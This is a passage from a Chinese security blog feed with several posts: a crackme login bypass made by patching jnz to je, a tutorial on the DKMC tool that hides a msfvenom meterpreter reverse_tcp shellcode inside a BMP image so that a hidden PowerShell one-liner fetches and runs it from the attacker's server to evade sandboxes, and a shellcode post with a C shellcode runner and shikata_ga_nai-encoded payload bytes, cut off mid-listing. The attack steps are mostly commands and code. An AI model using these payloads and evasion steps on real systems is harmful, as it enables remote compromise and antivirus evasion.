src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506780093452.jpg" alt="enter description here"></p><p>程序停止</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506780105042.jpg" alt="enter description here"></p><h2 id="修改汇编指令"><a href="#修改汇编指令" class="headerlink" title="修改汇编指令"></a>修改汇编指令</h2><p>我们重新载入OD ，依旧找到  jnz  位置，双击jnz 处汇编代码，将jnz其修改为je<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506780236693.jpg" alt="enter description here"></p><p>JE——若ZF&#x3D;1，则跳转，jnz 与je 相反<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/908A788C-B88E-4611-8457-E4B02705BDD1.png" alt="enter description here"><br>&nbsp;<br>修改完后，我们将其运行程序，同样得到成功登录<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506780615266.jpg" alt="enter description here"><br>&nbsp;<br>学无止境，有兴趣看OND 老哥的逆向课，可以加入技术群 群号:307283889 ，一起交流技术性探讨。如有文章相关不对的地方，可指出，谢谢！！！</p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POC_calc | window 10</title>
      <link href="/POC-calc.html"/>
      <url>/POC-calc.html</url>
      
        <content type="html"><![CDATA[<h1 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h1><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/calc.mp4'    frameborder="0"     allowfullscreen></iframe>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DKMC | bmp | Msf | kali linux 2017</title>
      <link href="/DKMC.html"/>
      <url>/DKMC.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/DKMC.mp4'    frameborder="0"     allowfullscreen></iframe><p>和往常一样打开一些国外网站，吸收他们的知识，但是有个视频确是深深的吸引了我的眼球，也是一个不错的项目和思路，今天我就给我分享一下这款工具的使用。</p><p>GitHub： <a href="https://github.com/Mr-Un1k0d3r/DKMC">https://github.com/Mr-Un1k0d3r/DKMC</a><br>youtube：<a href="https://youtu.be/xGZ0X5eA2IA">https://youtu.be/xGZ0X5eA2IA</a></p><h2 id="1-Don’t-Kill-My-Cat-DKMC"><a href="#1-Don’t-Kill-My-Cat-DKMC" class="headerlink" title="1.Don’t Kill My Cat (DKMC)"></a>1.Don’t Kill My Cat (DKMC)</h2><p>DKMC是一个工具，它产生存储在多边形图片内的模糊的shellcode。 该图片是100％有效的，还有100％有效的shellcode。 这个想法是避免沙盒分析，因为它是一个简单的“合法”图片。 现在，该工具依靠PowerShell来执行最终的shellcode有效负载。</p><p>基本流程（过程）<br>1.生成shellcode （msfvenom）<br>2.将msf的shellcode嵌入到图片内<br>3.PowerShell下载图片并执行图片作为shellcode<br>4.得到 shell</p><h2 id="2-安装使用"><a href="#2-安装使用" class="headerlink" title="2.安装使用"></a>2.安装使用</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/Mr-Un1k0d3r/DKMC </span><br><span class="line">$ cd DKMC</span><br><span class="line">$ mkdir output</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263324017.jpg" alt="enter description here"></p><h2 id="3-使用前准备"><a href="#3-使用前准备" class="headerlink" title="3.使用前准备"></a>3.使用前准备</h2><p>1.将所有类型的图片都转换bmp格式,关于如何转换可自行百度在线转换地址。<br>我这里已经提前转换好了<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263654535.jpg" alt="enter description here"></p><p>2.准备一枚由msfvenom  生成的PAYLOAD，使用为未初始化的格式</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263825342.jpg" alt="enter description here"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse<span class="emphasis">_tcp LHOST=192.168.1.103 LPORt=4444 -f raw &gt;demon</span></span><br></pre></td></tr></table></figure><p>3.启动msfconsole （控制台），进行监听</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506264396655.jpg" alt="enter description here"></p><h2 id="4-正式使用DKMC功能"><a href="#4-正式使用DKMC功能" class="headerlink" title="4.正式使用DKMC功能"></a>4.正式使用DKMC功能</h2><p>首先进入它的使用界面<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506263324017.jpg" alt="enter description here"></p><p>首先来简单介绍一下 </p><pre>1.sc功能 是将msf生成的raw文件 转换位shellcode代码2.gen 功能 是将其msf的shellcode注入到BMP 图片中3.ps 功能将其BMP的图片转换为powershell代码4.web 功能 将其开启web功能</pre><h2 id="1-我们首先要用到的是sc功能"><a href="#1-我们首先要用到的是sc功能" class="headerlink" title="1.我们首先要用到的是sc功能"></a>1.我们首先要用到的是sc功能</h2><p>（将其msf的shellcode注入到BMP 图片中）</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265200817.jpg" alt="enter description here"></p><p>设置msfvenom 生成的文件路径，然后run 生成shellcode</p><pre>(shellcode)>>> set source demon    [+] source value is set.(shellcode)>>> run</pre><p>将其shellcode代码进行保存，或者保存到文本文档 ，一会需要用到。<br>我们使用exit 退出当前模块，回到主菜单界面</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265496004.jpg" alt="enter description here"></p><h2 id="2-gen-功能"><a href="#2-gen-功能" class="headerlink" title="2.gen 功能"></a>2.gen 功能</h2><p>（是将其msf的shellcode注入到BMP 图片中）</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265578788.jpg" alt="enter description here"></p><p>这里需要设置两个地方一个是<br>1.转换后的bmp图片文件  2.设置shellcode</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265769879.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506265917418.jpg" alt="enter description here"></p><p>之后run ，output中会生成一个新的bmp 是由msfpayload注入生成的，之后我们还是一样exit ，退回主界面。使用ps功能</p><h2 id="3-ps功能"><a href="#3-ps功能" class="headerlink" title="3.ps功能"></a>3.ps功能</h2><p>(功能将其BMP的图片转换为powershell代码)<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266034961.jpg" alt="enter description here"></p><p>这里需要设置的是url 这块，格式  set url  <a href="http://ip地址/">http://ip地址</a> ：端口号 &#x2F;x.bmp</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266228942.jpg" alt="enter description here"></p><pre>(powershell)>>> set url http://192.168.1.103:8081/output-1506265715.bmp    [+] url value is set.(powershell)>>> run    [+] Powershell script:powershell.exe -nop -w hidden </pre><p>复制powershell代码  到文本文档 （可将其编辑格式为bat 或者ps1 即可）（本文不编辑其他格式直接复制粘贴代码）</p><p>4.web功能<br>（开启web服务）</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266510548.jpg" alt="enter description here"></p><p>folder  我这里就不设置他 ，因为bmp 生成的默认地址就是这个，需要改动的是我之前设置了url端口为8081，所以我这里也需要设置的一样为8081</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266631077.jpg" alt="enter description here"></p><h2 id="5-运行代码，得到会话"><a href="#5-运行代码，得到会话" class="headerlink" title="5.运行代码，得到会话"></a>5.运行代码，得到会话</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266879696.jpg" alt="enter description here"></p><p>得到会话，（这里我直接复制粘贴代码，可以选择将其编辑为bat、ps1、exe等格式运行）<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506266911876.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> linux </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的shellcode编写之路 | MSF| Shellcode  | kali linux 2017</title>
      <link href="/secist-shellcode.html"/>
      <url>/secist-shellcode.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/secist-shellcode.mp4'    frameborder="0"     allowfullscreen></iframe><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=27630183&auto=0&height=66"></iframe><h2 id="1-我有一个大胆的想法"><a href="#1-我有一个大胆的想法" class="headerlink" title="1.我有一个大胆的想法"></a>1.我有一个大胆的想法</h2><p>其实shellcode的这篇的灵感也是在与和车王两人的沟通，在他的带领下 也是才知道<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>  原来也有shellcode的一篇新的视角，也是在第二天的时间，也是偷偷的趁着上班的空余时间 研究了一下，上帝第一视角。也是蛮有意思的事情。在shellcode中包含了很多平台的shellcode。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505477898281.jpg" alt="enter description here"></p><h2 id="2-无心插柳柳成荫"><a href="#2-无心插柳柳成荫" class="headerlink" title="2.无心插柳柳成荫"></a>2.无心插柳柳成荫</h2><p>当我无意间浏览到某篇文章后，已经吸引了我的注意力了<br><a href="https://www.exploit-db.com/exploits/37758/">https://www.exploit-db.com/exploits/37758/</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505478268488.jpg" alt="enter description here"></p><h2 id="3-shellcode-弹窗hellword-警告窗口"><a href="#3-shellcode-弹窗hellword-警告窗口" class="headerlink" title="3.shellcode 弹窗hellword 警告窗口"></a>3.shellcode 弹窗hellword 警告窗口</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># include <span class="language-xml"><span class="tag">&lt;<span class="name">stdlib.h</span>&gt;</span></span></span></span><br><span class="line"><span class="section"># include <span class="language-xml"><span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span></span></span><br><span class="line"><span class="section"># include <span class="language-xml"><span class="tag">&lt;<span class="name">string.h</span>&gt;</span></span></span></span><br><span class="line"> </span><br><span class="line"><span class="section"># include <span class="language-xml"><span class="tag">&lt;<span class="name">windows.h</span>&gt;</span></span></span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">int</span><br><span class="line">main(void)</span><br><span class="line">&#123;</span><br><span class="line">  char <span class="emphasis">*shellcode = &quot;\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78&quot;</span></span><br><span class="line"><span class="emphasis">    &quot;\x69\x74\x54\x53\xff\xd6\x57\xff\xd0&quot;;</span></span><br><span class="line"><span class="emphasis"> </span></span><br><span class="line"><span class="emphasis">  DWORD why_must_this_variable;</span></span><br><span class="line"><span class="emphasis">  BOOL ret = VirtualProtect (shellcode, strlen(shellcode),</span></span><br><span class="line"><span class="emphasis">    PAGE_EXECUTE_READWRITE, &amp;why_must_this_variable);</span></span><br><span class="line"><span class="emphasis"> </span></span><br><span class="line"><span class="emphasis">  if (!ret) &#123;</span></span><br><span class="line"><span class="emphasis">    printf (&quot;VirtualProtect\n&quot;);</span></span><br><span class="line"><span class="emphasis">    return EXIT_FAILURE;</span></span><br><span class="line"><span class="emphasis">  &#125;</span></span><br><span class="line"><span class="emphasis"> </span></span><br><span class="line"><span class="emphasis">  printf(&quot;strlen(shellcode)=%d\n&quot;, strlen(shellcode));</span></span><br><span class="line"><span class="emphasis"> </span></span><br><span class="line"><span class="emphasis">  ((void (*</span>)(void))shellcode)();</span><br><span class="line"> </span><br><span class="line">  return EXIT<span class="emphasis">_SUCCESS;</span></span><br><span class="line"><span class="emphasis">&#125;</span></span><br></pre></td></tr></table></figure><p>我们来手动的进行编译一下看看具体的效果如何 是不是和他说的一样 会弹框 （hello word）<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/91D81B3717235DAA0518E2443145D3D2.png" alt="enter description here"></p><p>   1.可以看到弹窗的内容是 helloword ，也可以看到代码中并无helloword的字符串以及MessageBox 的调用，也就是相关重点的代码就在于shellcode的硬编码。</p><p>   2.那么这就让我想到了msfvenom的shellcode代码 ，由msfvenom生成的恶意的shellcode的。也就是以c生成shellcode硬编码。相关如何的msfvenom </p><p>   3.也可以在<a href="https://github.com/demonsec666/secist_script">https://github.com/demonsec666/secist_script</a> 中找到我之前录制的msf课程中的第五课 也有提到过msfvenom的教程 ，亦可以查看官方文档<a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">https://www.offensive-security.com/metasploit-unleashed/msfvenom/</a></p><p>   <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505482728515.jpg" alt="enter description here"></p><h2 id="4-shellcode-msfvenom"><a href="#4-shellcode-msfvenom" class="headerlink" title="4.shellcode_msfvenom"></a>4.shellcode_msfvenom</h2><p>本篇就以&#x2F;<a href="http://www.offensive-security.com/">www.offensive-security.com</a> 中的msfvenom 教程为例</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505482827337.jpg" alt="enter description here"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind<span class="emphasis">_tcp -e x86/shikata_</span>ga<span class="emphasis">_nai -b &#x27;\x00&#x27; -i 3 -f python</span></span><br><span class="line"><span class="emphasis">Found 1 compatible encoders</span></span><br><span class="line"><span class="emphasis">Attempting to encode payload with 3 iterations of x86/shikata_</span>ga<span class="emphasis">_nai</span></span><br><span class="line"><span class="emphasis">x86/shikata_</span>ga<span class="emphasis">_nai succeeded with size 326 (iteration=0)</span></span><br><span class="line"><span class="emphasis">x86/shikata_</span>ga<span class="emphasis">_nai succeeded with size 353 (iteration=1)</span></span><br><span class="line"><span class="emphasis">x86/shikata_</span>ga<span class="emphasis">_nai succeeded with size 380 (iteration=2)</span></span><br><span class="line"><span class="emphasis">x86/shikata_</span>ga<span class="emphasis">_nai chosen with final size 380</span></span><br><span class="line"><span class="emphasis">Payload size: 380 bytes</span></span><br><span class="line"><span class="emphasis">buf = &quot;&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x6d\xfc\x58\xba\x82\xf9\xc0\x9a\x35\x72\x7d\x01\x9b&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\xe7\x31\x16\x82\xf6\xe2\x89\x89\x75\x67\xf7\xaa\xae&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x73\x88\x3f\xf5\x6d\x3d\x9e\xab\x06\xda\xff\x42\x7a&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x63\x6b\x72\x59\xf6\x58\xa5\xfe\x3f\x0b\x41\xa0\xf2&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\xfe\x2d\xc9\x32\x3d\xd4\x51\xf7\xa7\x56\xf8\x69\x08&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x4d\x27\x8a\x2e\x19\x99\x7c\xfc\x63\xfa\x5c\xd5\xa8&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x1f\xa8\x9b\x88\xbb\xa5\x3c\x8f\x7f\x38\x45\xd1\x71&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x34\x59\x84\xb0\x97\xa0\x99\xcc\xfe\x7f\x37\xe2\x28&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\xea\x57\x01\xcf\xf8\x1e\x1e\xd8\xd3\x05\x67\x73\xf9&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x32\xbb\x76\x8c\x7c\x2f\xf6\x29\x0f\xa5\x36\x2e\x73&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\xde\x31\xc3\xfe\xae\x49\x64\xd2\x39\xf1\xf2\xc7\xa0&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x06\xd3\xf6\x1a\xfe\x0a\xfe\x28\xbe\x1a\x42\x9c\xde&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x01\x16\x27\xbd\x29\x1c\xf8\x7d\x47\x2c\x68\x06\x0e&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x23\x31\xfe\x7d\x58\xe8\x7b\x76\x4b\xfe\xdb\x17\x51&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\xfa\xdf\xff\xa1\xbc\xc5\x66\x4b\xea\x23\x86\x47\xb4&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\xe7\xd5\x71\x77\x2e\x24\x4a\x3d\xb1\x6f\x12\xf2\xb2&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\xd0\x55\xc9\x23\x2e\xc2\xa5\x73\xb2\xc8\xb7\x7d\x6b&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x55\x29\xbc\x26\xdd\xf6\xe3\xf6\x25\xc6\x5c\xad\x9c&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x9d\x18\x08\x3b\xbf\xd2\xff\x92\x18\x5f\x48\x9b\xe0&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x7b\x03\xa5\x32\x11\x27\x2b\x25\xcd\x44\xdb\xbd\xb9&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\xcd\x48\xda\x56\x4c\x56\xd5\x04\x87\x48\x3a\x6b\x9c&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x2a\x15\x4d\xbc\x0b\x56\x06\xb5\xc9\x46\xd0\xfa\x68&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\xa6\x76\xe9\x52\x2c\x24\x62\x28\xe1\x1d\x87\xb0\x66&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x93\x85\x8f\x87\x0f\xcf\x16\x29\x76\x03\x55\x0c\x0e&quot;</span></span><br><span class="line"><span class="emphasis">buf += &quot;\x3f\x17\xac&quot;</span></span><br></pre></td></tr></table></figure><p>可以看到使用msfvenom 自动帮我们生成恶意的shellcode<br>1.其中的-a 代表 的是目标的架构 如：x86</p><p>2.–platform 代表的是一个目标机的平台 如： windows</p><p>3.那么-p 呢  代表的是msf的payload的以及-e 和-b 呢 代表这个 encoder编码器，-b 表示去除硬编码中的0x00代码，因为0x00代表着结束的符号，所以我们不能让他出现0x00这个代码。</p><p>4.最后的 -i 和-f 分别代表的是iterations和format （迭代次数和格式）</p><p>那么我们将其代码重新改改，我们比如需要的功能是meterperter、指定ip和端口、指定shellcode 编码格式如：c或者python等代码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse<span class="emphasis">_tcp LHOST=攻击者</span></span><br><span class="line"><span class="emphasis">IP地址  LPORT=攻击者端口  -e x86/shikata_</span>ga<span class="emphasis">_nai -b &#x27;\x00&#x27; -i 迭代次数  -f  c</span></span><br></pre></td></tr></table></figure><p>那么简短来说就是</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-p去指定payload为 windows/meterpreter/reverse<span class="emphasis">_tcp</span></span><br><span class="line"><span class="emphasis">LHOST 和LPORT 指定攻击者ip和端口</span></span><br><span class="line"><span class="emphasis">-e指定x86/shikata_</span>ga<span class="emphasis">_nai 编码器</span></span><br><span class="line"><span class="emphasis">-i 指定迭代为如 5次 或10次等</span></span><br><span class="line"><span class="emphasis">-f 指定输出的格式 如c 代码 、或者python等其他格式的代码 </span></span><br><span class="line"><span class="emphasis">-f参数可以参考msfvenom的帮助参数 查看-f的支持格式</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505484222188.jpg" alt="enter description here"></p><h2 id="6-shellcode-c-msf"><a href="#6-shellcode-c-msf" class="headerlink" title="6.shellcode_c_msf"></a>6.shellcode_c_msf</h2><p>最终我们可以得到由msfvenom 生成C的shellcode代码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse<span class="emphasis">_tcp  LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_</span>ga<span class="emphasis">_nai -b &#x27;\x00&#x27; -i 4 -f c</span></span><br><span class="line"><span class="emphasis">Found 1 compatible encoders</span></span><br><span class="line"><span class="emphasis">Attempting to encode payload with 4 iterations of x86/shikata_</span>ga<span class="emphasis">_nai</span></span><br><span class="line"><span class="emphasis">x86/shikata_</span>ga<span class="emphasis">_nai succeeded with size 360 (iteration=0)</span></span><br><span class="line"><span class="emphasis">x86/shikata_</span>ga<span class="emphasis">_nai succeeded with size 387 (iteration=1)</span></span><br><span class="line"><span class="emphasis">x86/shikata_</span>ga<span class="emphasis">_nai succeeded with size 414 (iteration=2)</span></span><br><span class="line"><span class="emphasis">x86/shikata_</span>ga<span class="emphasis">_nai succeeded with size 441 (iteration=3)</span></span><br><span class="line"><span class="emphasis">x86/shikata_</span>ga<span class="emphasis">_nai chosen with final size 441</span></span><br><span class="line"><span class="emphasis">Payload size: 441 bytes</span></span><br><span class="line"><span class="emphasis">Final size of c file: 1878 bytes</span></span><br><span class="line"><span class="emphasis">unsigned char buf[] = </span></span><br><span class="line"><span class="emphasis">&quot;\xd9\xe1\xbf\xc4\xbd\x41\x38\xd9\x74\x24\xf4\x5e\x31\xc9\xb1&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x68\x31\x7e\x19\x83\xee\xfc\x03\x7e\x15\x26\x48\x9a\xec\x1c&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x99\x40\x70\xdd\x07\x0e\xae\xe9\xe6\xc6\x67\xa0\x76\x28\x2e&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xd8\x7b\x1c\xd4\x5f\x95\x5c\x0a\x80\xed\x24\xaf\x55\xee\xe0&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xf9\x80\x7f\x1a\x88\x1f\xde\xba\xa7\x09\x17\x25\x1f\x2c\x37&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x5d\x53\x6c\x7a\x01\xd2\x99\x69\x5b\x61\x14\x0a\xe1\x2b\xe1&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x62\x0c\x07\x9b\x67\xe4\x56\x2f\xf8\xa0\x7e\xdd\xfe\x6d\x0f&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\xa2\x0e\xfc\x24\xcd\xce\xc0\xa3\x8b\x96\xe5\x1b\x26\xbd\x58&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x8d\xcc\x2b\x71\xe4\x37\xda\xb7\xca\x2e\xe1\xe2\x19\xd9\xbf&quot;</span></span><br><span class="line"><span class="emphasis">&quot;\x29\x5c\xed\x2b\x32\x0f\x9f\x81\x59\xf9\x3b\x31\x57\xe1\x38&quot;</span></span><br><span class="line"><span 